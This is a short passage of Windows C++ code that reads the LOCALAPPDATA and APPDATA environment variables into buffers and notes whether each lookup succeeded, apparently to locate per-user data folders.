     wchar_t la[1024], aa[1024];
     bool have_la = GetEnvironmentVariableW(L"LOCALAPPDATA",la,1024) != 0;
     bool have_aa = GetEnvironmentVariableW(L"APPDATA",aa,1024) != 0;
